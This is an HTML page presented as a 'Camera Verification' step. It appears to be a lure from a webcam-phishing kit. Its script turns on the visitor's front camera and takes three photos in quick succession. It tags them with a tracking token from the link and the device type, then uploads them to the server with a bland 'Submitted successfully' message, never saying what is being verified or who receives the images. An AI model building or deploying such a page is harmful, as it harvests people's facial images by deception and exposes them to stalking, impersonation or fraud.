<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>Verification</title>
</head>
<body>

<h2>Camera Verification</h2>
<p>Please allow camera access and press the button below.</p>

<button onclick="startCamera()">Enable Camera</button>
<button onclick="takePhotos()">Submit</button>

<video id="video" autoplay playsinline></video>
<canvas id="canvas" style="display:none;"></canvas>

<script>
const video = document.getElementById("video");
const canvas = document.getElementById("canvas");

const params = new URLSearchParams(window.location.search);
const token = params.get("token") || "NO_TOKEN";

const device = /Mobi|Android/i.test(navigator.userAgent) ? "Mobile" : "Desktop";
let photos = [];

function startCamera() {
  navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
    .then(stream => video.srcObject = stream)
    .catch(() => alert("Camera access denied"));
}

function takePhotos() {
  let count = 0;
  const interval = setInterval(() => {
    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;
    canvas.getContext("2d").drawImage(video, 0, 0);
    canvas.toBlob(blob => photos.push(blob));
    count++;
    if (count === 3) {
      clearInterval(interval);
      sendData();
    }
  }, 800);
}

function sendData() {
  const fd = new FormData();
  fd.append("token", token);
  fd.append("device", device);
  photos.forEach((p, i) => fd.append("photo" + i, p));

  fetch("/upload", { method: "POST", body: fd })
    .then(() => alert("Submitted successfully"));
}
</script>

</body>
</html>
